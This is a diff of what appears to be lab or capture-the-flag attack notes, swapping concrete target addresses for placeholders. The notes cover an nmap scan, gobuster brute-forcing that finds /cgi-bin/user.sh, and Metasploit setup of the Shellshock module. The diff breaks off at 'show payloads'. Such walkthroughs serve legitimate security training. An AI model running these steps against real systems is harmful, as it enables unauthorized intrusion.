@@ -7,7 +7,7 @@
 ## prev enum
 
 ```sh
-sudo nmap -sS -sC -sV -oA ./nmap/full_sS -O -p- 192.168.0.1
+sudo nmap -sS -sC -sV -oA ./nmap/full_sS -O -p- <hostslot>
   # rename-tab
 sudo vim /etc/hosts
 ```
@@ -17,11 +17,11 @@ sudo vim /etc/hosts
 ```sh
 dict="/usr/share/wordlists/dirb/common.txt"
 ls -lah $dict                                    # 36KB
-gobuster dir -u http://example/ -w $dict -t 20 -e -x php,asp,json,aspx
+gobuster dir -u http://<hostslot>/ -w $dict -t 20 -e -x php,asp,json,aspx
   # 5min
   # find /cgi-bin/ (status 403)
 
-gobuster dir -u http://example/cgi-bin/ -w /usr/share/wordlists/dirb/common.txt -t 20 -e -x cgi,sh,pl,py,rb,php
+gobuster dir -u http://<hostslot>/cgi-bin/ -w /usr/share/wordlists/dirb/common.txt -t 20 -e -x cgi,sh,pl,py,rb,php
   # 5min
   # find /user.sh (status 200)
 ```
@@ -64,12 +64,12 @@ sudo -l
 ## msf
 
 ```msfconsole
-msf> search example
+msf> search <keywords>
   # 2  exploit/multi/http/apache_mod_cgi_bash_env_exec      2014-09-24       excellent  Yes    Apache mod_cgi Bash Environment Variable Code Injection (Shellshock)
 msf> use 2
 msf> show advanced
 msf> show options
-msf> set RHOSTS example
+msf> set RHOSTS <hostslot>
 msf> ...
 
 msf> show payloads
